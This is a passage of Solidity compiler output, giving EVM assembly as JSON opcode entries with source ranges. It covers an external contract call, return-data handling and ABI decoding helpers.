										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 424,
											"end": 453,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 342,
											"end": 463,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 342,
											"end": 463,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 342,
											"end": 463,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 342,
											"end": 463,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 371,
											"end": 378,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 453,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 404,
											"end": 409,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 400,
											"end": 454,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 389,
											"end": 454,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 389,
											"end": 454,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 503,
											"end": 510,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 550,
											"end": 555,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 532,
											"end": 556,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 532,
											"end": 556,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 521,
											"end": 556,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 521,
											"end": 556,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 659,
											"end": 664,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 641,
											"end": 665,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 634,
											"end": 639,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 631,
											"end": 666,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 621,
											"end": 684,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 680,
											"end": 681,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 677,
											"end": 678,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 670,
											"end": 682,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 621,
											"end": 684,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 742,
											"end": 747,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 780,
											"end": 786,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 767,
											"end": 787,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 758,
											"end": 787,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 758,
											"end": 787,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 823,
											"end": 828,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 796,
											"end": 829,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "tag",
											"source": 2,
											"value": "6"
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 909,
											"end": 915,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 917,
											"end": 923,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 966,
											"end": 968,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 954,
											"end": 963,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 945,
											"end": 952,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 941,
											"end": 964,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 937,
											"end": 969,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 972,
											"end": 1051,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1092,
											"end": 1093,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1162,
											"end": 1169,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1153,
											"end": 1159,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1142,
											"end": 1151,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 1138,
											"end": 1160,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 1117,
											"end": 1170,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1107,
											"end": 1170,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1107,
											"end": 1170,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1063,
											"end": 1180,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1219,
											"end": 1221,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1290,
											"end": 1297,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1281,
											"end": 1287,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1270,
											"end": 1279,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 1266,
											"end": 1288,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 1245,
											"end": 1298,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1235,
											"end": 1298,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1235,
											"end": 1298,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1190,
											"end": 1308,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1426,
											"end": 1431,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1408,
											"end": 1432,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1403,
											"end": 1406,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1396,
											"end": 1433,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1667,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 1445,
											"end": 1667,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1538,
											"end": 1542,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1576,
											"end": 1578,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1565,
											"end": 1574,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1561,
											"end": 1579,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1553,
											"end": 1579,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1553,
											"end": 1579,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1589,
											"end": 1660,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1657,
											"end": 1658,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1646,
											"end": 1655,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1642,
											"end": 1659,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1633,
											"end": 1639,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1589,
											"end": 1660,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 1589,
											"end": 1660,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1589,
											"end": 1660,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1589,
											"end": 1660,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1667,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1667,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1667,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1667,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1445,
											"end": 1667,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1673,
											"end": 1750,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 1673,
											"end": 1750,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1710,
											"end": 1717,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1739,
											"end": 1744,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1728,
											"end": 1744,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1728,
											"end": 1744,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1673,
											"end": 1750,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1673,
											"end": 1750,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1673,
											"end": 1750,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1673,
											"end": 1750,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1756,
											"end": 1878,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1756,
											"end": 1878,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1829,
											"end": 1853,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1847,
											"end": 1852,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1829,
											"end": 1853,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 1829,
											"end": 1853,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1829,
											"end": 1853,
											"name": "tag",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1829,
											"end": 1853,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1822,
											"end": 1827,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1819,
											"end": 1854,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 1809,
											"end": 1872,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1809,
											"end": 1872,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1868,
											"end": 1869,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1865,
											"end": 1866,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1858,
											"end": 1870,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1809,
											"end": 1872,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1809,
											"end": 1872,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1756,
											"end": 1878,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1756,
											"end": 1878,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1884,
											"end": 2027,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 1884,
											"end": 2027,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1941,
											"end": 1946,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1972,
											"end": 1978,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1966,
											"end": 1979,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 1957,
											"end": 1979,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1957,
											"end": 1979,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1988,
											"end": 2021,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2015,
											"end": 2020,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1988,
											"end": 2021,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1988,
											"end": 2021,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1988,
											"end": 2021,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1988,
											"end": 2021,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1884,
											"end": 2027,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1884,
											"end": 2027,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1884,
											"end": 2027,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1884,
											"end": 2027,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1884,
											"end": 2027,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2033,
											"end": 2384,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 2033,
											"end": 2384,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2103,
											"end": 2109,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2152,
											"end": 2154,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2140,
